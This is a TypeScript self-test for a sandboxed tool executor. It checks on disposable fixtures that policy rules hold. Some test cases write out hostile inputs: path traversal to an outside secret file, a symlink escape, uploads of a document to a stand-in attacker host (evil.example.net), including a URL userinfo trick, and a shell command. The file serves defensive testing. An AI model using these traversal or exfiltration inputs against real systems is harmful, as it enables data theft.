/**
 * Safe protection test. Runs the REAL ProtectedExecutor and trusted tools against disposable fixtures in a temp folder, with an
 * in-memory test policy. It never touches your files, your organization's policies, the real network or any subprocess.
 * Prevention is verified by OBSERVING THE FIXTURES AND A LOCAL RECEIVER, not by trusting a "blocked" message.
 */
import { createServer } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { LocalPolicyClient } from "../executor/local-authority.js";
import { createTrustedTools } from "../executor/trusted.js";
import { ProtectedExecutor } from "../sdk/index.js";
import type { PolicyDocument } from "../shared/policy.js";

export interface SelfTestCheck { name: string; pass: boolean; detail: string; skipped?: boolean }
export interface SelfTestResult { passed: boolean; checks: SelfTestCheck[]; ran_at: string; scope: string }

const POLICY: PolicyDocument = {
  schema_version: 1,
  rules: [
    { id: "no-commands", effect: "deny", match: { operations: ["command_execution"] } },
    { id: "delete-needs-approval", effect: "require_approval", match: { tools: ["documents"], operations: ["delete"], resources: ["docs/**"] } },
    { id: "read-docs", effect: "allow", match: { tools: ["documents"], operations: ["read"], resources: ["docs/**"] } },
    { id: "write-summaries", effect: "allow", match: { tools: ["documents"], operations: ["create"], resources: ["summaries/**"] } },
    { id: "send-partner", effect: "allow", match: { tools: ["transfer"], operations: ["external_transfer"], destination_domains: ["partner.example.com"] } },
  ],
};

export async function runSelfTest(): Promise<SelfTestResult> {
  const base = mkdtempSync(join(tmpdir(), "heimdall-selftest-"));
  const checks: SelfTestCheck[] = [];
  const check = (name: string, pass: boolean, detail: string, skipped = false) => checks.push({ name, pass: pass || skipped, detail, skipped });
  const hits: string[] = [];
  const receiver = createServer((req, res) => {
    let b = "";
    req.on("data", (c) => (b += c));
    req.on("end", () => {
      hits.push(`${req.headers.host}:${b}`);
      res.writeHead(200).end("ok");
    });
  });
  await new Promise<void>((r) => receiver.listen(0, "127.0.0.1", r));
  const port = (receiver.address() as { port: number }).port;
  try {
    const root = join(base, "protected");
    const outside = join(base, "outside");
    mkdirSync(join(root, "docs"), { recursive: true });
    mkdirSync(join(root, "summaries"), { recursive: true });
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(root, "docs", "handbook.txt"), "FIXTURE HANDBOOK");
    writeFileSync(join(root, "docs", "old-notes.txt"), "FIXTURE NOTES");
    writeFileSync(join(outside, "secret.txt"), "FIXTURE OUTSIDE SECRET");
    const { tools } = createTrustedTools({
      root,
      egress: { testReceiver: { port }, resolve: async (h) => { if (h === "partner.example.com" || h === "evil.example.net") return ["127.0.0.1"]; throw new Error("NXDOMAIN"); } },
    });
    let shellRan = 0;
    const executor = new ProtectedExecutor(new LocalPolicyClient(POLICY).asClient(), { ...tools, shell: { execute: async () => { shellRan++; } } });

    const read = await executor.run({ tool: "documents", operation: "read", resource: "docs/handbook.txt" });
    check("Allowed document read succeeds", read.status === "executed" && (read as any).result?.content === "FIXTURE HANDBOOK", `status=${read.status}`);

    const sum = await executor.run({ tool: "documents", operation: "create", resource: "summaries/s.txt", args: { text: "summary" } });
    check("Allowed summary is written", sum.status === "executed" && readFileSync(join(root, "summaries", "s.txt"), "utf8") === "summary", `status=${sum.status}`);

    const del = await executor.run({ tool: "documents", operation: "delete", resource: "docs/old-notes.txt" });
    const del2 = await executor.run({ tool: "documents", operation: "delete", resource: "reports/x.txt" });
    check("Unauthorized deletion leaves the file intact (observed on disk)", existsSync(join(root, "docs", "old-notes.txt")) && del.status !== "executed" && del2.status !== "executed", `approval-required delete: ${del.status}; unlisted delete: ${del2.status}; file present=${existsSync(join(root, "docs", "old-notes.txt"))}`);

    const trav = await executor.run({ tool: "documents", operation: "read", resource: "../outside/secret.txt" });
    check("Path traversal is refused and the outside file is untouched", trav.status !== "executed" && !JSON.stringify(trav).includes("OUTSIDE SECRET"), `status=${trav.status}`);

    try {
      symlinkSync(outside, join(root, "docs", "link"), process.platform === "win32" ? "junction" : "dir");
      const lnk = await executor.run({ tool: "documents", operation: "read", resource: "docs/link/secret.txt" });
      check("A junction/symlink out of the folder is refused", lnk.status !== "executed" && !JSON.stringify(lnk).includes("OUTSIDE SECRET"), `status=${lnk.status}`);
    } catch (e) {
      check("A junction/symlink out of the folder is refused", true, `could not create a link here (${(e as Error).message}); skipped`, true);
    }

    const bad = await executor.run({ tool: "transfer", operation: "external_transfer", resource: "docs/handbook.txt", destination: "https://evil.example.net/upload" });
    const trick = await executor.run({ tool: "transfer", operation: "external_transfer", resource: "docs/handbook.txt", destination: "https://partner.example.com@evil.example.net/x" });
    check("Upload to an unapproved destination sends no data (local receiver saw nothing)", bad.status !== "executed" && trick.status !== "executed" && hits.length === 0, `receiver requests=${hits.length}`);
    const good = await executor.run({ tool: "transfer", operation: "external_transfer", resource: "docs/handbook.txt", destination: "https://partner.example.com/inbox" });
    check("Upload to the approved destination does reach the receiver (the test is not vacuous)", good.status === "executed" && hits.length === 1 && hits[0].endsWith("FIXTURE HANDBOOK"), `status=${good.status}; receiver requests=${hits.length}`);

    const cmd = await executor.run({ tool: "shell", operation: "command_execution", resource: "host/shell", args: { command: "calc.exe" } });
    check("Arbitrary command execution is refused before any handler runs", cmd.status === "denied" && shellRan === 0, `status=${cmd.status}; handler invocations=${shellRan}`);
  } finally {
    receiver.close();
    rmSync(base, { recursive: true, force: true });
  }
  return {
    passed: checks.every((c) => c.pass),
    checks,
    ran_at: new Date().toISOString(),
    scope: "Local enforcement mechanics on disposable fixtures with a built-in test policy. It does not test your organization's policies and touches no real files.",
  };
}
